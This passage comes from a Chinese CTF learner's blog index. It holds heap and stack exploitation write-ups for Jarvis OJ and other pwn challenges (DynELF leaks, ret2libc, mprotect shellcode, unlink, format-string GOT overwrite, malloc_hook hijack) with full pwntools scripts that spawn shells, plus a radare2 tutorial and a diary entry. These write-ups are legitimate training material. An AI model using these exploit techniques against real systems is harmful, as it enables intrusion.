base-----------free(2)free(1)fill(0,&apos;a&apos;*0x10+p64(0)+p64(0x21)+p8(0x80))fill(3,&apos;d&apos;*0x10+p64(0)+p64(0x21))allocate(0x10)allocate(0x10)fill(3,&apos;d&apos;*0x10+p64(0)+p64(0x91))allocate(0x80)free(4)dump(2)sh.recvuntil(&apos;Content: \\n&apos;)leak_addr = u64(sh.recv(8))main_arena = leak_addr - 88libc_base = main_arena - 0x3c4b20print &apos;main_arena: &apos;+hex(main_arena)print &apos;libc_base: &apos;+hex(libc_base)#gdb.attach(sh)#------------hjack malloc_hook --------one_gadget_off = 0x4526aone_gadget_addr = libc_base + one_gadget_offprint &apos;one_gadget_addr: &apos;+hex(one_gadget_addr)allocate(0x60)free(4)fill(2,p64(main_arena - 0x33))allocate(0x60)allocate(0x60)fill(6,&apos;a&apos;*0x13+p64(one_gadget_addr))#gdb.attach(sh)allocate(0x100)sh.interactive() reference:https://blog.csdn.net/qq_35519254/article/details/78213962?utm_source=blogxgwz1https://bbs.pediy.com/thread-223461.htm 没有人指导堆的学习，日常入门到入土，太难受了。主要是前天打比赛结果很惨烈，希望能加把劲把基础的堆问题给解决掉，下次比赛尽量能够解决一些堆的题。","categories":[{"name":"pwn","slug":"pwn","permalink":"http://siriuswhiter.tk/categories/pwn/"}],"tags":[{"name":"pwn","slug":"pwn","permalink":"http://siriuswhiter.tk/tags/pwn/"},{"name":"heap","slug":"heap","permalink":"http://siriuswhiter.tk/tags/heap/"}]},{"title":"Diary.20181008","slug":"diary-20181008","date":"2018-10-08T13:10:48.000Z","updated":"2018-10-15T12:17:30.737Z","comments":true,"path":"2018/10/08/diary-20181008/","link":"","permalink":"http://siriuswhiter.tk/2018/10/08/diary-20181008/","excerpt":"","text":"下午摸了一道题，比较简单的格式化字符串；之后摸手机端的 termux ，试图在上面安装 nmap，metasploit；nmap还是很顺利的，但是metasploit搞到自闭……各种安装包问题，一步一步的找问题找解决方法才好不容易把解决；黑域brevent也搞了半天，最后我还是选择绿色守护……手机最近掉电掉的有点严重，必须管一管了；配合帅气的termux，搞了个hacker’s keyboard ，打起字来方便了不少， 还换了个hacker live wallpaper，也就是像是黑客帝国那样的动态壁纸，hhhh整个手机炫酷了不少。周四林少华老师要来学校做客震旦讲堂！！！一定要过去，顺便看能不能混个签名hhh …搞了半天特定文章的加密，反而全都无法通过，搞不懂怎么回事…真麻烦 12345678910&lt;script&gt; (function()&#123; if(&apos;&#123;&#123; page.password&#125;&#125;&apos; !== 0)&#123; if (prompt(&apos;PASSWORD&apos;) !== &apos;&#123;&#123; page.password &#125;&#125;&apos;)&#123; alert(&apos;Wrong！&apos;); history.back(); &#125; &#125; &#125;)();&lt;/script&gt; 上面这个运用js的alert阻断机制，但是会把我所有文章都加密。。这下好了，越来越糟糕 hexo-blog-encrypt 这个组件都不能用。。没办法了","categories":[{"name":"diary","slug":"diary","permalink":"http://siriuswhiter.tk/categories/diary/"}],"tags":[{"name":"diary","slug":"diary","permalink":"http://siriuswhiter.tk/tags/diary/"}]},{"title":"Radare2","slug":"radare2","date":"2018-09-25T02:56:08.000Z","updated":"2019-02-15T04:58:55.616Z","comments":true,"path":"2018/09/25/radare2/","link":"","permalink":"http://siriuswhiter.tk/2018/09/25/radare2/","excerpt":"","text":"之前听闻学长说许多大佬都用这个工具？(雾；就没事来瞎搞一搞这个可以用来逆向或pwn的神器？感觉还是很帅的hhhh，就是用起来有点emmm 安装git clone r2仓库即可，尽量每天使用前 ./sys/install.sh 更新一下 123$ git clone https://github.com/radare/radare2.git$ cd radare2$ ./sys/install.sh 使用之后学习使用中逐渐更新常用包含工具： radare2-&gt;整合了所有工具 rabin2-&gt;查看文件格式的 radiff2-&gt;比较文件不同的 rahash2-&gt;各种密码算法，hash算法集成 rasm2-&gt;汇编和反汇编 ragg2-&gt;开发shellcode工具(radare2自己编写的编译器) radare2随便加载个文件,会有一句欢迎语hhhh 123$r2 pwnme -- We only have bugs, features are an unintended side-effect[0x08049090]&gt; //工具找到的入口位置 rabin2查看文件基本信息 123456789101112131415161718192021222324252627282930# rabin2 -I pwnmearch x86baddr 0x8048000binsz 14275bintype elfbits 32canary falsesanitiz falseclass ELF32crypto falseendian littlehavecode trueintrp /lib/ld-linux.so.2lang clinenum truelsyms truemachine Intel 80386maxopsz 16minopsz 1nx trueos linuxpcalign 0pic falserelocs truerelro partialrpath NONEstatic falsestripped falsesubsys linuxva true rahash2支持超多加解密 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263# rahash2 -L //列举Available Hashes: h md5h sha1h sha256h sha384h sha512h md4h xorh xorpairh parityh entropyh hamdisth pcprinth mod255h xxhashh adler32h luhnh crc8smbush crc15canh crc16h crc16hdlch crc16usbh crc16citth crc24h crc32h crc32ch crc32ecma267h crc32bzip2h crc32dh crc32mpeg2h crc32posixh crc32qh crc32jamcrch crc32xferh crc64h crc64ecmah crc64weh crc64xzh crc64isoAvailable Encoders/Decoders: e base64e base91e punycodeAvailable Crypto Algos: c rc2c rc4c rc6c aes-ecbc aes-cbcc rorc rolc rotc blowfishc cps2c des-ecbc xorc serpent-ecb# rahash2 -a md5 ./pwnme //生成md5哈希./pwnme: 0x00000000-0x00003c73 md5: 2569b37607fc52065f5b4e7c349d0e56 rasm2支持汇编反汇编 ragg2据说可以用来快速开发shellcode？ radiff2支持二进制文件的字节级或增量差异对比，查找基本代码块中的更改。 厂商更新漏洞时，可以寻找更新代码字段，说不定在那里还有希望挖到其他洞 rafind2在文件中查找字节模式 rarun2用于在不同环境中运行程序的启动器，具有不同的参数，权限，目录和 覆盖的默认文件描述符。 rarun2可用于： * 破解小程序 * 模糊测试 * 测试组件 rax2用于shell的简约数学表达式求值器，用于在浮点值，十六进制表示， 十六进制字符串到ASCII之间进行基本转换，八进制到整数等。 它还支持字节顺序设置，如果没有参数，可以用作交互式shell 给出。 常用命令 i 开头的命令主要是用来获取各种信息。iz – 列出数据段里的字符串 1234567891011[0x08049090]&gt; ie[Entrypoints]vaddr=0x08049090 paddr=0x00001090 baddr=0x08048000 laddr=0x00000000 haddr=0x00000018 type=program1 entrypoints[0x08049090]&gt; iz[Strings]Num Vaddr Paddr Len Size Section Type String000 0x00002008 0x0804a008 7 8 (.rodata) ascii /bin/sh001 0x00002010 0x0804a010 5 6 (.rodata) ascii input a 开头的命令主要是用来分析文件。radare2 不会主动去分析一个文件，因为这样做的代价太大了，它需要花费很多的时间。也可以在运行 radare2的使用 -A 参数来直接分析一个文件(例如 r2 -A pwnme) 12345678# r2 -A pwnme[x] Analyze all flags starting with sym. and entry0 (aa)[x] Analyze function calls (aac)[x] Analyze len bytes of instructions for references (aar)[x] Constructing a function name for fcn.* and sym.func.* functions (aan)[x] Type matching analysis for all functions (afta)[x] Use -AA or aaaa to perform additional experimental analysis. -- r2OS r2pad 0.1 SMP GENERIC r2_64 GNU/r2OS fs 分析完成之后， r2会将所有有用的信息和特定的名字绑定在一起，比如区段、函数、符号、字符串，这些都被称作 ‘flags’, flags 被整合进 ，一个 flag 是所有类似特征的集合。可以使用 ‘fs ‘ 加 ‘f’ 来打印出 这个 flags 下面包含的信息，使用分号来间隔多条命令(‘cmd1;cmd2;cmd3;…’). 1234567891011[0x08049090]&gt; fs0 2 * strings1 37 * symbols2 30 * sections3 12 * segments4 5 * relocs5 5 * imports6 2 * functions[0x08049090]&gt; fs strings;f0x0804a008 8 str.bin_sh0x0804a010 6 str.input axt 命令用来在 data/code段里找寻某个地址相关的引用（更多的操作，请看 ‘ax?’）.‘@@’就像一个迭代器，用来在地址空间里不断地匹配后面一系列相关的命令（更多操作，请看 ‘@@?’）， ‘str.*’ 是一个通配符，用来标记所有以 ‘str.’开头的信息，这个不光会列出字符串标志，同时也包括函数名，找到它们到底在哪里以及何处被调用。 vv 大概是会显示函数列表和入口处的函数？可以查看各个函数(花里胡哨的，很漂亮哦，不如我们。。) 12345678910111213141516171819202122232425-[ functions ]----------------- pdf ---(a) add (x) xrefs (q) quit (jk) next/prev ;-- section..text:(r) rename (c) calls (g) go (tab) column ;-- eip:(d) delete (v) vars (?) help (:) enter cmd / (fcn) entry0 50&gt;* 0x08049090 50 entry0 | entry0 (); 0x080490c3 4 fcn.080490c3 | 0x08049090 xor ebp, ebp ; [14] -r-x secti 0x08049070 6 sym.imp.__libc_start_main | 0x08049092 pop esi 0x080490f0 40 sym.deregister_tm_clones | 0x08049093 mov ecx, esp 0x08049130 53 sym.register_tm_clones | 0x08049095 and esp, 0xfffffff0 0x08049170 30 sym.__do_global_dtors_aux | 0x08049098 push eax 0x080491a0 2 entry1.init | 0x08049099 push esp 0x080492b0 2 sym.__libc_csu_fini | 0x0804909a push edx 0x080490e0 4 sym.__x86.get_pc_thunk.bx | 0x0804909b call fcn.080490c3 0x080492b4 20 sym._fini | 0x080490a0 add ebx, 0x2f60 ; &apos;`/&apos; 0x08049250 93 sym.__libc_csu_init | 0x080490a6 lea eax, [ebx - 0x2d50] 0x080490d0 2 sym._dl_relocate_static_pie | 0x080490ac push eax ; func fini 0x08049203 65 sym.main | 0x080490ad lea eax, [ebx - 0x2db0] 0x08049244 4 sym.__x86.get_pc_thunk.ax | 0x080490b3 push eax ; func init 0x08049050 6 sym.imp.puts | 0x080490b4 push ecx ; char **ubp_av 0x080491cd 54 sym.vulnerable | 0x080490b5 push esi ; int argc 0x08049040 6 sym.imp.gets | 0x080490b6 mov eax, sym.main ; 0x8049203 0x080491a2 43 sym.flag | 0x080490bc push eax ; func main 0x08049060 6 sym.imp.system \\ 0x080490bd call sym.imp.__libc_start_main ; int __libc_star 0x08049000 35 sym._init 0x08049080 6 sub.__gmon_start_80 s 命令可以跳转到某个地址或者已经有了符号的函 数中去。然后我们使用pdf这个命令可以打印main这个函数的汇编代码。 12345678910111213141516171819202122232425262728293031[0x08049090]&gt; s main[0x08049203]&gt; pdf ;-- main:/ (fcn) sym.main 65| sym.main (int argc, char **argv, char **envp);| ; var int local_8h @ ebp-0x8| ; arg int arg_4h @ esp+0x4| ; DATA XREF from entry0 (0x80490b6)| 0x08049203 8d4c2404 lea ecx, [arg_4h] ; 4| 0x08049207 83e4f0 and esp, 0xfffffff0| 0x0804920a ff71fc push dword [ecx - 4]| 0x0804920d 55 push ebp| 0x0804920e 89e5 mov ebp, esp| 0x08049210 53 push ebx| 0x08049211 51 push ecx| 0x08049212 e82d000000 call sym.__x86.get_pc_thunk.ax| 0x08049217 05e92d0000 add eax, 0x2de9| 0x0804921c 83ec0c sub esp, 0xc| 0x0804921f 8d9010e0ffff lea edx, [eax - 0x1ff0]| 0x08049225 52 push edx ; const char *s| 0x08049226 89c3 mov ebx, eax| 0x08049228 e823feffff call sym.imp.puts ; int puts(const char *s)| 0x0804922d 83c410 add esp, 0x10| 0x08049230 e898ffffff call sym.vulnerable| 0x08049235 b800000000 mov eax, 0| 0x0804923a 8d65f8 lea esp, [local_8h]| 0x0804923d 59 pop ecx| 0x0804923e 5b pop ebx| 0x0804923f 5d pop ebp| 0x08049240 8d61fc lea esp, [ecx - 4]\\ 0x08049243 c3 ret radare2还实现了IDA的类似F5功能，我们可以使用pdc命令来实现。(目前看上去真不怎么样 12345678910111213141516171819202122232425262728293031323334[0x08049203]&gt; pdcfunction sym.main () &#123; // 1 basic blocks loc_0x8049203: //DATA XREF from entry0 (0x80490b6) ecx = [arg_4h] //4 esp &amp;= 0xfffffff0 //ebp push dword [ecx - 4] push ebp ebp = esp push ebx push ecx sym.__x86.get_pc_thunk.ax () eax += 0x2de9 //obj._GLOBAL_OFFSET_TABLE esp -= 0xc edx = [eax - 0x1ff0] //&quot;input&quot; str.input push edx //const char *s ; (pstr 0x0804a010) &quot;input&quot; ebx = eax //obj._GLOBAL_OFFSET_TABLE int puts(const char * s : (*0x804a010)0x00177fe0 = input) esp += 0x10 sym.vulnerable () eax = 0 esp = [local_8h] pop ecx pop ebx //ebp esp = [ecx - 4] //ebp return(break)&#125; 还有框架结构界面，我们可以使用大写的VV命令来到框架结构界面。(很赞 .---------------------------------------------------. | [0x8049203] | | ;-- main: | | ;-- eip: | | (fcn) sym.main 65 | | sym.main (int argc, char **argv, char **envp); | | ; var int local_8h @ ebp-0x8 | | ; arg int arg_4h @ esp+0x4 | | ; DATA XREF from entry0 (0x80490b6) | | ; 4 | | lea ecx, [arg_4h] | | and esp, 0xfffffff0 | | push dword [ecx - 4] | | push ebp | | mov ebp, esp | | push ebx | | push ecx | | call sym.__x86.get_pc_thunk.ax;[ga] | | add eax, 0x2de9 | | sub esp, 0xc | | lea edx, [eax - 0x1ff0] | | ; const char *s | | push edx | | mov ebx, eax | | ; int puts(const char *s) | | call sym.imp.puts;[gb] | | add esp, 0x10 | | call sym.vulnerable;[gc] | | mov eax, 0 | | lea esp, [local_8h] | `---------------------------------------------------&apos; 目前就了解了这一点，参考了一些大佬的文章，之后可以尝试着去使用，仅仅局限于IDA,GDB是不行的。就这样。","categories":[{"name":"pwn","slug":"pwn","permalink":"http://siriuswhiter.tk/categories/pwn/"}],"tags":[{"name":"pwn","slug":"pwn","permalink":"http://siriuswhiter.tk/tags/pwn/"},{"name":"tech","slug":"tech","permalink":"http://siriuswhiter.tk/tags/tech/"}]},{"title":"Jarvis OJ-pwn","slug":"jarvis-oj-pwn","date":"2018-09-13T06:17:19.000Z","updated":"2018-12-19T12:38:25.412Z","comments":true,"path":"2018/09/13/jarvis-oj-pwn/","link":"","permalink":"http://siriuswhiter.tk/2018/09/13/jarvis-oj-pwn/","excerpt":"","text":"开始漫漫刷题之路 level4 - DynELF题目给的东西很少，基本信息如下： 信息main：123456int __cdecl main(int argc, const char **argv, const char **envp)&#123; vulnerable_function(); write(1, &quot;Hello, World!\\n&quot;, 0xEu); return 0;&#125; vulnerable_function：123456ssize_t vulnerable_function()&#123; char buf; // [esp+0h] [ebp-88h] return read(0, &amp;buf, 0x100u);&#125; 保护：只开启了nx。123456&apos;/root/pwnprac/level4&apos; Arch: i386-32-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x8048000) 分析read很明显会溢出，溢出到返回地址覆盖为system的地址即可，问题在于其地址的寻找，也就是该题的重点：DynELF。最终思路就是因为可以不断的通过调用write函数来leak函数地址，使用dynelf可以通过泄露的地址确定libc版本来确定system地址。/bin/sh则可以通过调用read来将其写入bss段，调用即可。 exp1234567891011121314151617181920212223242526272829from pwn import *#sh = process(&apos;./level4&apos;)sh = remote(&apos;pwn2.jarvisoj.com&apos;,9880)libc = ELF(&apos;./level4&apos;)bss_add = libc.bss() //直接得到bss段地址def leak(add): //leak函数 pay1 = &apos;a&apos;*0x88 + &apos;bbbb&apos; + p32(libc.symbols[&apos;write&apos;]) + p32(libc.symbols[&apos;vulnerable_function&apos;]) + p32(1) + p32(add) + p32(4) sh.send(pay1) data = sh.recv(4) return data#神奇DynELF工具使用d = DynELF(leak,elf = ELF(&apos;./level4&apos;)) //初始化DynELF模块 sys_add = d.lookup(&apos;system&apos;,&apos;libc&apos;) //在libc文件中搜索system函数的地址 print hex(sys_add)pay2 = &apos;a&apos;*0x88 + &apos;bbbb&apos; + p32(libc.symbols[&apos;read&apos;]) + p32(libc.symbols[&apos;vulnerable_function&apos;]) + p32(0) + p32(bss_add) + p32(8) //调用readsh.send(pay2)sh.send(&apos;/bin/sh\\x00&apos;) pay3 = &apos;a&apos;*0x88 + &apos;bbbb&apos; + p32(sys_add) + &apos;dead&apos; + p32(bss_add)sh.send(pay3)sh.interactive() 获得shell1234[*] Switching to interactive mode$ whoamictf$ 参考:借助DynELF实现无libc的漏洞利用小结 level3_x64 - 64位参数传递当参数少于7个时， 参数从左到右放入寄存器: rdi, rsi, rdx, rcx, r8, r9。当参数为7个以上时， 前 6 个与前面一样， 但后面的依次从 “右向左” 放入栈中，即和32位汇编一样。 搞了一早上感觉思路完全没毛病，但是poc总是不能用，最终与网上的wp调试比对半天才发现在该文档下的libc-2.19.so文件不是该题的配套libc！！！！！应该是之前某个题的。。。心态爆炸重新下载源文件，问题解决。。。 信息：漏洞函数：明显的栈溢出1234567ssize_t vulnerable_function()&#123; char buf; // [rsp+0h] [rbp-80h] write(1, &quot;Input:\\n&quot;, 7uLL); return read(0, &amp;buf, 0x200uLL);&#125; 思路：整体思路与之前相同：泄露write函数got地址，然后通过调用write函数泄露write真实地址，之后system，/bin/sh什么的手到擒来。所以主要就是练习x64下的参数传递。 exp1234567891011121314151617181920212223242526272829303132from pwn import *#context.log_level = &apos;debug&apos;sh = remote(&apos;pwn2.jarvisoj.com&apos;,9883)#sh = process(&apos;level3&apos;)pwn = ELF(&apos;level3_x64&apos;)libc = ELF(&apos;libc-2.19.so&apos;)pop_rdi_ret = 0x004006b3 #pop rdi ; retpop_rsi_r15_ret = 0x004006b1 #pop rsi ; pop r15 ; retsys_libc_addr = libc.symbols[&apos;system&apos;]binsh_libc_addr = libc.search(&apos;/bin/sh&apos;).next()#----------To get write.got--------------# pay1 = &apos;a&apos;*0x80 + &apos;bbbbbbbb&apos;pay1 += p64(pop_rdi_ret) + p64(0) + p64(pop_rsi_r15_ret) + p64(pwn.got[&apos;write&apos;]) + p64(1) //虽然找不到pop_rdx_ret,但是经调试，rdx值大于8，所以我们可以只接受前八个字符即可。pay1 += p64(pwn.symbols[&apos;write&apos;]) + p64(pwn.symbols[&apos;vulnerable_function&apos;])sh.recvuntil(&quot;Input:\\n&quot;)sh.send(pay1)write_addr = u64(sh.recv(8))#---------call system func---------------#sys_addr = write_addr - libc.symbols[&apos;write&apos;] + sys_libc_addrbinsh_addr = write_addr - libc.symbols[&apos;write&apos;] + binsh_libc_addrpay2 = &apos;a&apos;*0x80 + &apos;bbbbbbbb&apos; pay2 += p64(pop_rdi_ret) + p64(binsh_addr) + p64(sys_addr)sh.send(pay2)sh.interactive() 获得shell： 123$ whoamictf$ level5 - mmap &amp;&amp; mprotect信息同level3_x64 , 假设system 和 execve 被禁用，使用mmap 及mprotect 获取shell 思路先搞清楚mmap 与 mprotect：mmap 就是分配堆内存的那个mmap，原函数为 12#include&lt;sys/mman.h&gt;void* mmap(void* addr, size_t len, int port, int flag, int filedes, off_t off); mprotect，给addr开始的len长度的内存修改权限，原函数为 1int mprotect(void *addr, size_t len, int prot); 所以可以将shellcode写入bss段之类的调用mprotect函数将其可执行，然后返回地址到shellcode处即可；当然也可以mmap分配一段空间然后一样的操作。 exp稍微有点问题。。但是找不到，莫得办法。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384from pwn import *context.log_level = &apos;debug&apos;#sh = remote(&apos;pwn2.jarvisoj.com&apos;,9884)sh = process(&apos;level3_x64&apos;)pwn = ELF(&apos;level3_x64&apos;)libc = ELF(&apos;libc-2.19.so&apos;)pop_rdi_ret = 0x004006b3 #pop rdi ; retpop_rsi_r15_ret = 0x004006b1 #pop rsi ; pop r15 ; ret#----------To get write.got--------------#sh.recv()pay1 = &apos;a&apos;*0x80 + &apos;bbbbbbbb&apos;pay1 += p64(pop_rdi_ret) + p64(1) + p64(pop_rsi_r15_ret) + p64(pwn.got[&apos;write&apos;]) + p64(0) pay1 += p64(pwn.symbols[&apos;write&apos;]) + p64(pwn.symbols[&apos;vulnerable_function&apos;])sh.send(pay1)#gdb.attach(sh)write_addr = u64(sh.recv(8))#gdb.attach(sh)print &quot;write_addr : &quot; + hex(write_addr)#----------to get mprotect.got and write shellcode to bss_addr------#mprotect_got_addr = write_addr - libc.symbols[&apos;write&apos;] + libc.symbols[&apos;mprotect&apos;]print &quot;mprotect_got_addr : &quot;+ hex(mprotect_got_addr)bss_addr = pwn.bss()print &quot;bss_addr : &quot; + hex(bss_addr)pay2 = &apos;a&apos;*0x80 + &apos;bbbbbbbb&apos;pay2 += p64(pop_rdi_ret) + p64(1) + p64(pop_rsi_r15_ret) + p64(bss_addr) + p64(0) pay2 += p64(pwn.symbols[&apos;read&apos;]) + p64(pwn.symbols[&apos;vulnerable_function&apos;])sh.send(pay2)shellcode = asm(shellcraft.sh())sh.send(shellcode)sh.recv()#-------------------to write bss &amp;&amp; mprotect to .got table----------------#bss_got_addr = 0x600a80mprotect_got_addr = 0x600a78pay3 = &apos;a&apos;*0x80 + &apos;bbbbbbbb&apos;pay3 += p64(pop_rdi_ret) + p64(0) + p64(pop_rsi_r15_ret) + p64(bss_got_addr) + p64(0) + p64(pwn.symbols[&apos;read&apos;])pay3 += p64(pop_rdi_ret) + p64(0) + p64(pop_rsi_r15_ret) + p64(mprotect_got_addr) + p64(0) + p64(pwn.symbols[&apos;read&apos;])pay3 += p64(pwn.symbols[&apos;vulnerable_function&apos;])sh.send(pay3)sh.send(p64(bss_got_addr))sh.send(p64(mprotect_got_addr))gdb.attach(sh)#---------------------------init_start = 0x4006a6init_end = 0x400690pay4 = &apos;a&apos;*0x80 + &apos;bbbbbbbb&apos;pay4 += p64(init_start) + &apos;bbbbbbbb&apos;pay4 += p64(0) #rbxpay4 += p64(1) #rbppay4 += p64(mprotect_got_addr) pay4 += p64(7) #r13-&gt;rdxpay4 += p64(0x1000) #r14-&gt;rsipay4 += p64(0x600000) #r15-&gt;rdipay4 += p64(init_end) + &apos;bbbbbbbb&apos; pay4 += p64(0) + p64(1) + p64(bss_got_addr) + p64(0) + p64(0) + p64(0)pay4 += p64(init_end)sh.send(pay4)sh.interactive() level6 - 堆的unlink利用正常的选项类型题 信息main:12345678910111213141516171819202122232425262728293031323334353637int __cdecl main()&#123; unsigned int v0; // eax alarm_func(); main_ptr(); while ( 1 ) &#123; v0 = menu();LABEL_3: switch ( v0 ) &#123; case 1u: list(); continue; case 2u: add(); continue; case 3u: edit(); continue; case 4u: delete(); v0 = menu(); if ( v0 &gt; 5 ) goto LABEL_6; goto LABEL_3; case 5u: puts(&quot;Bye&quot;); return 0; default:LABEL_6: puts(&quot;Invalid!&quot;); break; &#125; &#125;&#125; 问题函数：delete函数未检查inuse位，可以double free，且free完并未清空指针。 12345678910111213141516171819202122int delete()&#123; int v0; // eax int v1; // edx int v3; // eax if ( *(_DWORD *)(dword_804A2EC + 4) &lt;= 0 ) return puts(&quot;No notes yet.&quot;); printf(&quot;Note number: &quot;); v0 = get_num(); if ( v0 &lt; 0 ) return puts(&quot;Invalid number!&quot;); v1 = dword_804A2EC; if ( v0 &gt;= *(_DWORD *)dword_804A2EC ) return puts(&quot;Invalid number!&quot;); --*(_DWORD *)(dword_804A2EC + 4); v3 = v1 + 12 * v0; *(_DWORD *)(v3 + 8) = 0; *(_DWORD *)(v3 + 12) = 0; free(*(void **)(v3 + 16)); return puts(&quot;Done.&quot;);&#125; 同时add与edit会对输入的大小进行（或许）与0x80的对齐，即向上对齐到0x80,0x100,0x180,0x200这样子。不过只需要输入申请大小的内容即可。 保护：（基本上不用看。。） 123456[*] &apos;/root/pwnprac/freenote_x86&apos; Arch: i386-32-little RELRO: No RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x8048000) 思路(有点迷) 首先分配5个大小为0x80的内存块（0,1,2,3,4），之后按顺序free掉3号与1号（这样1号内存的fd指针会指向3号），这样0号内存块就可以使用1号内存块的pre_size 与size 位，但我们可以edit 0号内存块大小为0x90，目的是为了在对齐机制的情况下，系统会分配0x100大小的内存块，但因为需要输入申请内存大小的内容，所以只要0x90，即刚好覆盖1号内存块的pre_size与size位，此时可以打印出1号内存块的fd指针，从而泄露出堆的基地址与0号内存的地址。 之后unlink，因为delete漏洞的存在，1号块可以double free,将0号块卸下。这样子就可以对0号块为所欲为。(不太懂怎么为所欲为的) exp（待参透）1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889909192939495from pwn import *#context.log_level = &apos;debug&apos;context.terminal = [&apos;terminator&apos;,&apos;-x&apos;,&apos;bash&apos;,&apos;-c&apos;]local = 0if local: cn = process(&quot;./freenote_x86&quot;) bin = ELF(&quot;freenote_x86&quot;) libc = ELF(&quot;/lib/i386-linux-gnu/libc.so.6&quot;)else: cn = remote(&apos;pwn2.jarvisoj.com&apos;,9885) bin = ELF(&quot;freenote_x86&quot;) libc = ELF(&quot;libc-2.19.so&quot;)def list_post(): passdef add_post(length,content): cn.sendline(&apos;2&apos;) cn.recvuntil(&apos;Length&apos;) cn.sendline(str(length)) cn.recvuntil(&apos;Enter&apos;) cn.sendline(content)def edit_post(idx,length,content): cn.sendline(&apos;3&apos;) cn.recvuntil(&apos;number&apos;) cn.sendline(str(idx)) cn.recvuntil(&apos;Length&apos;) cn.sendline(str(length)) cn.recvuntil(&apos;Enter&apos;) cn.sendline(content)def del_post(idx): cn.sendline(&apos;4&apos;) cn.recvuntil(&apos;number&apos;) cn.sendline(str(idx))#chunk_list=0x0804A2EC#test=0x08048CC5#-------init-------for i in range(5): add_post(0x80,str(i)*0x80)del_post(3)del_post(1)pay = &apos;0&apos;*0x80 + &apos;a&apos;*0x8edit_post(0,0x88,pay)#------------------#--------leak----------cn.sendline(&apos;1&apos;)cn.recvuntil(&apos;a&apos;*0x8)leak_addr = u32(cn.recv(4))cn.recv()heap_base = leak_addr - 0xdb0#offsetchunk0_addr = heap_base + 0x18success(&quot;leak_addr: &quot;+hex(leak_addr))success(&quot;heap_base: &quot;+hex(heap_base))success(&quot;chunk0_addr: &quot;+hex(chunk0_addr))#----------------------#-------unlink--------pay = p32(0x88) + p32(0x80) + p32(chunk0_addr-0xc) + p32(chunk0_addr-0x8) + &apos;0&apos;*(0x80-4*4)pay += p32(0x80) + p32(0x88+0x88)edit_post(0,len(pay),pay)del_post(1)#----------------------#--------leak----------pay = p32(2) + p32(1) + p32(0x88) + p32(chunk0_addr-0xc)pay += p32(1)+p32(0x4)+p32(bin.got[&apos;strtol&apos;])pay += &apos;\\x00&apos;*(0x88-len(pay))edit_post(0,len(pay),pay)cn.sendline(&apos;1&apos;)cn.recvuntil(&apos;0. &apos;)cn.recvuntil(&apos;1. &apos;)strtol = cn.recvuntil(&apos;\\x0a&apos;)[:-1]cn.recv()strtol = u32(strtol)system = strtol - libc.symbols[&apos;strtol&apos;]+libc.symbols[&apos;system&apos;]success(&quot;strtol: &quot;+hex(strtol))success(&quot;system: &quot;+hex(system))#----------------------#--------hijack&amp;getshell--------edit_post(1,4,p32(system))cn.sendline(&quot;$0&quot;)#----------------------cn.interactive() 获得shell 123Your choice: $ whoamictf$","categories":[{"name":"pwn","slug":"pwn","permalink":"http://siriuswhiter.tk/categories/pwn/"}],"tags":[{"name":"pwn","slug":"pwn","permalink":"http://siriuswhiter.tk/tags/pwn/"},{"name":"stack","slug":"stack","permalink":"http://siriuswhiter.tk/tags/stack/"},{"name":"heap","slug":"heap","permalink":"http://siriuswhiter.tk/tags/heap/"}]},{"title":"pwn-300-Formatting string vulnerability","slug":"pwn-300解析-格式化字符串漏洞利用巩固","date":"2018-09-11T01:51:39.000Z","updated":"2018-09-25T13:44:41.876Z","comments":true,"path":"2018/09/11/pwn-300解析-格式化字符串漏洞利用巩固/","link":"","permalink":"http://siriuswhiter.tk/2018/09/11/pwn-300解析-格式化字符串漏洞利用巩固/","excerpt":"","text":"pwn-300之前有一道pwn-200，也具有canary保护及NX保护，但是直接给了system(‘/bin/sh’)的函数，所以问题的关键就在于如何使程序转向该函数地址执行；幸运的是该程序同时具有格式化字符串漏洞。所以最后的思路就是，第一次输入，格式化字符串漏洞泄露canary，第二次输入溢出到函数返回地址即可。而这道题将输入由gets变为fgets，也就是即使泄露出canary也无法溢出利用（canary必定以/x00结尾），同时没有了现成的system(‘/bin/sh’)函数。 查看内容及保护main函数为：1234567891011121314int __cdecl main(int argc, const char **argv, const char **envp)&#123; char s; // [esp+Ch] [ebp-4Ch] unsigned int v5; // [esp+4Ch] [ebp-Ch] v5 = __readgsdword(0x14u); //canary生成 setvbuf(stdout, 0, 2, 0); setvbuf(stdin, 0, 1, 0); fgets(&amp;s, 64, stdin); //fgets,遇/x00停止 printf(&amp;s); //格式化字符串漏洞 fgets(&amp;s, 64, stdin); printf(&amp;s); return 0;&#125; 查看文件保护仍然是canary 与 栈不可执行； 1234567root@xuewenjie-kali:~/tikool# checksec binary_300[*] &apos;/root/tikool/binary_300&apos; Arch: i386-32-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: No PIE (0x8048000) 查看加载函数发现system函数 加载函数 确定思路想到可以使用格式化字符串覆盖某个函数的got表地址，看下程序流程，想到可以覆盖printf函数的got地址，在第二次输入’/bin/sh’，原先的printf(/bin/sh)就会变成system(/bin/sh)，获取shell； 流程实现确定字符串位置123root@xuewenjie-kali:~/tikool# ./binary_300aaaa%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x aaaa00000040.f7f285c0.00000000.00000000.00000000.00000000.61616161.78383025.3830252e 即字符串位于第六（相对于）或第七个（相对于） exp如下： 1234567891011121314151617from pwn import *#sh = process(&apos;./binary_300&apos;)sh = remote(&apos;bamboofox.cs.nctu.edu.tw&apos;,22003)libc = ELF(&apos;./binary_300&apos;)printf_got = libc.got[&apos;printf&apos;]system_add = libc.symbols[&apos;system&apos;]payload = fmtstr_payload(7, &#123;printf_got: system_add&#125;) //pwntools自带，用于生成格式化字符串payload；print payloadsh.sendline(payload)sh.recv()sh.sendline(&apos;/bin/sh&apos;)sh.interactive() 成功获得shell12345[*] Switching to interactive mode$ /bin/sh$ whoamictf$","categories":[{"name":"pwn","slug":"pwn","permalink":"http://siriuswhiter.tk/categories/pwn/"}],"tags":[{"name":"pwn","slug":"pwn","permalink":"http://siriuswhiter.tk/tags/pwn/"},{"name":"format","slug":"format","permalink":"http://siriuswhiter.tk/tags/format/"}]},{"title":"Introduction to pwn 1.3--ret2libc 